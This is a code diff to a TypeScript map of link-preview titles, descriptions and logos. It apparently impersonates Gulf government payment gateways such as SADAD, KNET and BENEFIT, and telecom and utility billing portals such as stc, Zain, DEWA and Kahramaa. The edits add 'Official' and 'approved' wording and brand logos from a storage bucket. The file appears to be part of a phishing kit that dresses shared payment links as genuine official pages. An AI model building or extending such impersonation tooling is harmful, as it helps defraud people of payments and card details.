@@ -5,34 +5,34 @@ import { getEntityPaymentShareImage, getEntityIdentity, detectEntityFromURL, get
 const companyMeta: Record<string, { title: string; description: string; image: string }> = {
   // Government Systems
   gov_sa: {
-    title: "بوابة سداد للمدفوعات الحكومية 🇸🇦",
-    description: "نظام المدفوعات الوطني السعودي - سدد رسوم الخدمات الحكومية والفواتير بأمان تام وسهولة عبر بوابة سداد الموحدة ✅",
-    image: "/assets/dynamic-identity/sadad_hero.jpg"
+    title: "بوابة سداد للمدفوعات الحكومية 🇸🇦 - SADAD Official",
+    description: "نظام المدفوعات الوطني السعودي - سدد رسوم الخدمات الحكومية والفواتير بأمان تام وسهولة عبر بوابة سداد الموحدة المعتمدة ✅",
+    image: "/gov-sadad-official.png"
   },
   gov_ae: {
-    title: "بوابة جيوان للمدفوعات الإلكترونية 🇦🇪",
-    description: "نظام البطاقة الوطنية الإماراتي - سدد فواتيرك وخدماتك الحكومية بأمان عبر منظومة الدفع الوطنية الإماراتية 💳",
-    image: "/assets/dynamic-identity/jaywan_hero.jpg"
+    title: "بوابة جيوان للمدفوعات الإلكترونية 🇦🇪 - Jaywan UAE",
+    description: "نظام البطاقة الوطنية الإماراتي - سدد فواتيرك وخدماتك الحكومية بأمان عبر منظومة الدفع الوطنية الإماراتية المعتمدة 💳",
+    image: "/gov-uae-logo.jpg"
   },
   gov_kw: {
-    title: "بوابة كي نت للمدفوعات الوطنية 🇰🇼",
-    description: "شبكة الكويت الوطنية للمدفوعات الإلكترونية - سدد رسومك الحكومية بأمان وموثوقية عبر بوابة KNET الرسمية 🇰🇼",
-    image: "/assets/dynamic-identity/knet_hero.jpg"
+    title: "بوابة كي نت للمدفوعات الوطنية 🇰🇼 - KNET Kuwait",
+    description: "شبكة الكويت الوطنية للمدفوعات الإلكترونية - سدد رسومك الحكومية بأمان وموثوقية عبر بوابة KNET الرسمية المعتمدة 🇰🇼",
+    image: "/gov-knet-logo.png"
   },
   gov_qa: {
-    title: "بوابة قطر للمدفوعات الحكومية 🇶🇦",
-    description: "نظام الدفع الإلكتروني الموحد لدولة قطر - سدد جميع مستحقات الخدمات الحكومية بأعلى معايير الأمان 🇶🇦",
-    image: "/assets/dynamic-identity/qatar_gov_hero.jpg"
+    title: "بوابة قطر للمدفوعات الحكومية 🇶🇦 - Qatar Gateway",
+    description: "نظام الدفع الإلكتروني الموحد لدولة قطر - سدد جميع مستحقات الخدمات الحكومية بأعلى معايير الأمان الرسمية 🇶🇦",
+    image: "/gov-qatar-logo.png"
   },
   gov_om: {
-    title: "بوابة مال للمدفوعات الوطنية 🇴🇲",
-    description: "منظومة الدفع الإلكتروني الوطنية لسلطنة عُمان - سداد سريع وآمن لجميع الرسوم والخدمات عبر بوابة مال 🇴🇲",
-    image: "/assets/dynamic-identity/maal_hero.jpg"
+    title: "بوابة مال للمدفوعات الوطنية 🇴🇲 - Maal Oman",
+    description: "منظومة الدفع الإلكتروني الوطنية لسلطنة عُمان - سداد سريع وآمن لجميع الرسوم والخدمات عبر بوابة مال المعتمدة 🇴🇲",
+    image: "/gov-maal-logo.jpg"
   },
   gov_bh: {
-    title: "بوابة بنفت للمدفوعات الوطنية 🇧🇭",
-    description: "الشبكة الإلكترونية البحرينية للمعاملات المالية - سدد رسومك وخدماتك الحكومية بأمان تام عبر منظومة بنفت 🇧🇭",
-    image: "/assets/dynamic-identity/benefit_hero.jpg"
+    title: "بوابة بنفت للمدفوعات الوطنية 🇧🇭 - BENEFIT Bahrain",
+    description: "الشبكة الإلكترونية البحرينية للمعاملات المالية - سدد رسومك وخدماتك الحكومية بأمان تام عبر منظومة بنفت الرسمية 🇧🇭",
+    image: "/gov-benefit-logo.png"
   },
   sa_absher: {
     title: "بوابة أبشر للمدفوعات الإلكترونية 🇸🇦",
@@ -139,6 +139,41 @@ const companyMeta: Record<string, { title: string; description: string; image: s
     title: "دفع آمن - المدفوعات المحلية 💳",
     description: "خدمات الدفع المحلي السريع - سدد مدفوعاتك المحلية بسهولة وأمان مع دعم جميع وسائل الدفع المحلية المعتمدة في دول الخليج 🌍",
     image: "/assets/dynamic-identity/official_logo_local.svg"
+  },
+  stc: {
+    title: "stc - سداد فواتير الاتصالات 🇸🇦",
+    description: "سدد فواتير stc والإنترنت والخدمات الرقمية بأمان وسرعة عبر بوابة الدفع الرسمية المعتمدة ✅",
+    image: "https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/stc-logo.png"
+  },
+  mobily: {
+    title: "موبايلي - سداد الفواتير والخدمات 🇸🇦",
+    description: "سدد فواتير موبايلي واشحن رصيدك بأمان تام عبر بوابة الدفع الإلكترونية الرسمية المعتمدة ✅",
+    image: "https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mobily-logo.png"
+  },
+  zain: {
+    title: "زين - سداد فواتير الاتصالات 🌍",
+    description: "سدد فواتير زين واشحن رصيدك بسهولة وأمان عبر بوابة الدفع الموحدة لعملاء زين المعتمدة ✅",
+    image: "https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/zain-logo.png"
+  },
+  dewa: {
+    title: "ديوا - سداد فواتير الكهرباء والمياه 🇦🇪",
+    description: "بوابة سداد فواتير هيئة كهرباء ومياه دبي (DEWA) - سدد فواتيرك بأمان وسرعة عبر القنوات الرسمية المعتمدة ✅",
+    image: "https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/dewa-logo.png"
+  },
+  etisalat: {
+    title: "اتصالات من e& - سداد الفواتير 🇦🇪",
+    description: "سدد فواتير اتصالات والإنترنت والخدمات المنزلية بأمان عبر بوابة الدفع الرقمية الرسمية المعتمدة ✅",
+    image: "https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/etisalat-logo.png"
+  },
+  ooredoo: {
+    title: "أوريدو - سداد الفواتير والخدمات 🇶🇦",
+    description: "سدد فواتير Ooredoo واشحن رصيدك بأمان وسرعة عبر بوابة الدفع الرسمية المعتمدة لعملاء أوريدو ✅",
+    image: "https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/ooredoo-logo.png"
+  },
+  kahramaa: {
+    title: "كهرماء - سداد فواتير الكهرباء والمياه 🇶🇦",
+    description: "بوابة سداد فواتير المؤسسة العامة القطرية للكهرباء والماء (كهرماء) - سدد بأمان تام عبر المنصة الرسمية المعتمدة ✅",
+    image: "https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/kahramaa-logo.png"
   },
   bank_pages: {
     title: "دفع آمن - البنوك الخليجية 🏦",
